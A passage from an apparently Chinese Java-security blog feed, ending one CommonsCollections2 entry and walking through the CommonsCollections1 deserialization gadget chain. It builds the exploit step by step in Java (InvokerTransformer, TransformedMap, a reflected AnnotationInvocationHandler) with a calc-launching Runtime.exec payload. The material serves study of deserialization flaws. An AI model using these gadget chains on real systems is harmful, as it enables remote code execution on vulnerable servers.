class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">priorityQueue.add(templates);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">TransformingComparator</span>&gt; transformingComparatorClass = transformingComparator.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">transformerField</span> <span class="operator">=</span> transformingComparatorClass.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">transformerField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">transformerField.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">serialize(priorityQueue);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h1 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h1><h1 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a>0x03 参考资料</h1><p>P牛知识星球-Java安全漫谈</p>
<p>B站-白日梦组长</p>
<p><a class="link"   href="https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&vd_source=19d2e433219440bcf5304fbe8a00b7ff" >https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&amp;vd_source=19d2e433219440bcf5304fbe8a00b7ff <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Y4tacker</p>
<p><a class="link"   href="https://github.com/Y4tacker/JavaSec" >https://github.com/Y4tacker/JavaSec <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections2</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonsCollections1</title>
    <url>/2023/09/09/Java%E5%AE%89%E5%85%A8/CommonsCollection1%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><strong>Commons Collections</strong>是Apache软件基金会的一个开源项目，它提供了一组可复用的数据结构和算法的实现，旨在扩展和增强Java集合框架，以便更好地满足不同类型应用的需求。该项目包含了多种不同类型的集合类、迭代器、队列、堆栈、映射、列表、集等数据结构实现，以及许多实用程序类和算法实现。它的代码质量较高，被广泛应用于Java应用程序开发中。</p>
<h1 id="0x01-利用链"><a href="#0x01-利用链" class="headerlink" title="0x01 利用链"></a>0x01 利用链</h1><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    AnnotationInvocationHandler.readObject()</span><br><span class="line">         MapEntry.setValue()</span><br><span class="line">             TransformedMap.checkSetValue()</span><br><span class="line">                 ChainedTransformer.transform()</span><br><span class="line">                     ConstantTransformer.transform()</span><br><span class="line">                     InvokerTransformer.transform()</span><br><span class="line">                         Method.invoke()</span><br><span class="line">                             Class.getMethod()</span><br><span class="line">                     InvokerTransformer.transform()</span><br><span class="line">                         Method.invoke()</span><br><span class="line">                             Runtime.getRuntime()</span><br><span class="line">                     InvokerTransformer.transform()</span><br><span class="line">                         Method.invoke()</span><br><span class="line">                             Runtime.exec()</span><br></pre></td></tr></table></figure></div>

<h1 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h1><p>首先，先写一个普通反射调用的方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//反射调用打开计算器</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">exec.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="Tranformer"><a href="#Tranformer" class="headerlink" title="Tranformer"></a>Tranformer</h2><p><strong>CC1</strong>链的源头就是<strong>Commons Collections</strong>库中的<strong>Tranformer</strong>接口，这个接口里面有个<strong>transform</strong>方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到接口中的<strong>transform</strong>方法要求传入一个对象，并且返回的也是一个对象。</p>
<p>寻找下继承了这个接口的类，由于知道利用链了，就直接看一下<strong>InvokerTransformer</strong>了</p>
<h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p><strong>InvokerTransformer</strong>是实现了<strong>transform</strong>接口的一个类，可以用来执行任意方法，这也是反序列化能执行任意代码的关键</p>
<p>在实例化这个<strong>InvokerTransformer</strong>时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = <span class="literal">null</span>;</span><br><span class="line">    iArgs = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>找到后面的回调<strong>transform</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);        </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以很清楚的看到参数是可控的，而且利用了反射的方法，这样就可以用来执行任意方法，这也是反序列化能执行任意代码的关键</p>
<p>改写成<strong>InvokerTransformer</strong>类调用的形式</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//反射调用打开计算器</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="comment">//Class c = Runtime.class;</span></span><br><span class="line"><span class="comment">//Method exec = c.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//exec.invoke(r,&quot;calc&quot;);</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure></div>

<p>再来寻找下，谁调用了<strong>transform</strong>，可以看到<strong>TransformedMap</strong>类中有挺多方法调用了<strong>transform</strong>方法</p>
<p>我们可以来看一下<strong>checkSetValue</strong>方法，可以看到调用了<strong>valueTransformer</strong>的<strong>transform</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>再找找<strong>valueTransformer</strong>是哪来的，可以直接看下构造函数</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那么我们这里就需要让<strong>valueTransformer</strong>为我们之前的<strong>invokerTransformer</strong>对象</p>
<p>可以看到构造器跟方法都是<strong>protected</strong>修饰，那就只能内部调用，不能外部实例化，所以就需要找到内部实例化的工具</p>
<p>往上翻可以看到有个<strong>decorate</strong>静态方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那就是说我们可以先调用<strong>decorate</strong>方法，在实例化这个类，然后在调用<strong>checkSetValue</strong>方法</p>
<p>那就修改下代码，改成<strong>decorate</strong>方法调用</p>
<p>这里把<strong>map</strong>当成参数传入，因为只要用到第三个参数<strong>valueTransformer</strong>，所以第二个参数<strong>keyTransformer</strong>可以为<strong>null</strong>，这里的<strong>valueTransformer</strong>就是前面的<strong>invokerTransformer</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//反射调用打开计算器</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化一个HashMap</span></span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">Map&lt;Object,Object&gt; transformedMp = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br></pre></td></tr></table></figure></div>

<p>再找一下哪里调用了checkSetValue方法</p>
<h2 id="MapEntry"><a href="#MapEntry" class="headerlink" title="MapEntry"></a>MapEntry</h2><p>可以看到只有<strong>AbstractInputCheckedMapDecorator</strong>的内部的<strong>MapEntry</strong>类中调用了<strong>checkSetValue()</strong></p>
<p><strong>AbstractInputCheckedMapDecorator</strong>也是<strong>TransformedMap</strong>父类，是一个抽象类。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        value = parent.checkSetValue(value);</span><br><span class="line">        <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以再找下谁调用了setValue方法，可以发现还挺多，那我们就尝试理解下这个给代码吧</p>
<p>在 Java 中，<strong>Map.Entry</strong> 是一个接口，用于表示 <strong>Map</strong> 接口中的键值对。它提供了访问和操作 <strong>Map</strong>中的键值对的方法。</p>
<p><code>Map.Entry</code> 接口定义了以下几个方法：</p>
<ul>
<li><code>getKey()</code>：返回键对象。</li>
<li><code>getValue()</code>：返回值对象。</li>
<li><code>setValue(V value)</code>：设置当前键对应的新值，并返回之前的旧值。</li>
<li><code>equals(Object obj)</code>：判断指定对象是否与当前键对相等。</li>
<li><code>hashCode()</code>：返回键对的哈希码值。</li>
</ul>
<p><strong>Map.Entry</strong> 接口通常用于遍历和操作 <strong>Map</strong> 集合中的键值对。通过调用 <strong>entrySet()</strong> 方法，可以获取<strong>Map</strong>对象中所有键值对的集合视图，并通过迭代器或增强型<strong>for</strong> 循环遍历每个键值对。</p>
<p>而上面的<strong>MapEntry</strong>其实就是重写了<strong>Map.Entry</strong>接口中的<strong>setValue</strong>方法，可以看到父类<strong>AbstractInputCheckedMapDecorator</strong>中有<strong>setValue</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> entry.setValue(object);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>而且<strong>AbstractInputCheckedMapDecorator</strong>还引入了<strong>Map.Entry</strong>接口，所以我们只需要遍历<strong>Map</strong>，就可以调用<strong>setValue</strong>方法，即调用了<strong>checkSetValue</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//遍历一个Map的写法</span></span><br><span class="line"><span class="keyword">for</span> (Map.Entry entry : map.entrySet()) &#123;</span><br><span class="line"> System.out.println(<span class="string">&quot;key= &quot;</span> + entry.getKey() + <span class="string">&quot; and value= &quot;</span> + entry.getValue());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//可以看到这里的entry就代表一个键值对，通过getKey()和getValue()方法得到键值</span></span><br></pre></td></tr></table></figure></div>

<p>所以改写下上面的代码，把** r **当成对象传入</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//反射调用打开计算器</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化一个HashMap</span></span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">Map&lt;Object,Object&gt; transformedMp = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Map.Entry entry: transformedMp.entrySet())&#123;</span><br><span class="line">    entry.setValue(r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>接着找一下哪里调用了<strong>setValue</strong>，最好是重写过的<strong>readObject</strong>方法，里面调用了<strong>setValue</strong></p>
<h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>可以看到<strong>AnnotationInvocationHandler</strong>这个类中看到有个调用了<strong>setValue</strong>方法的<strong>readObject</strong>方法，刚好也有个遍历<strong>Map</strong>的功能</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>看下构造器，可以看到第一个参数是继承了<strong>注解的class</strong>，第二个是<strong>Map</strong>，这里可以传入我们前面的<strong>transformedMp</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">        superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">        superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但是在定义这个类的时候并不是<strong>public</strong>，无法<strong>new</strong>出来，因此只能通过反射去实例化这个类。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//反射调用打开计算器</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        </span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        </span><br><span class="line">Map&lt;Object,Object&gt; transformedMp = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class, transformedMp);</span><br><span class="line"></span><br><span class="line">serialize(o);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>看着好像构造完了，但是会发现，运行的时候不会弹出计算器</p>
<p><strong>debug</strong>后可以发现<strong>AnnotationInvocationHandler</strong>类的<strong>readObject</strong>方法的<strong>for</strong>循环中</p>
<p><strong>if</strong>条件判断里<strong>memberType</strong>为空，导致<strong>setValue</strong>不能执行</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">    Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">    <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">        <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">              value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">            memberValue.setValue(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                     value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                        annotationType.members().get(name)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以知道<strong>memberType</strong>是取注解中成员变量的名称，然后并且检查键值对中键名是否有对应的名称</p>
<p>而我们所使用的<strong>Override</strong>注解是没有成员变量的</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target(ElementType.METHOD)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.SOURCE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Override &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但是可以发现，<strong>Target</strong>注解有个名为<strong>value</strong>的成员变量，而且也需要将<strong>put()</strong> 方法里面的<strong>key</strong>的值是否为<strong>value</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Target &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns an array of the kinds of elements an annotation type</span></span><br><span class="line"><span class="comment">     * can be applied to.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> an array of the kinds of elements an annotation type</span></span><br><span class="line"><span class="comment">     * can be applied to</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ElementType[] value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>所以只需将<strong>Override</strong>注解改成<strong>Target</strong>注解，则<strong>memberType</strong>就不会为空</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//反射调用打开计算器</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        </span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        </span><br><span class="line">Map&lt;Object,Object&gt; transformedMp = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMp);</span><br><span class="line"></span><br><span class="line">serialize(o);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="反射获取getRuntime"><a href="#反射获取getRuntime" class="headerlink" title="反射获取getRuntime"></a>反射获取getRuntime</h2><p>还有就是<strong>Runtime</strong>类是没有实现<strong>java.io.Serializable</strong>接口的，所以不允许被序列化。</p>
<p>但是<strong>Class</strong>类是可以被序列化的，所以我们需要利用反射来解决</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">exec.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>再将其改成<strong>InvokerTransformer</strong>调用</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(runtimeClass);</span><br><span class="line"></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]</span><br><span class="line">&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span 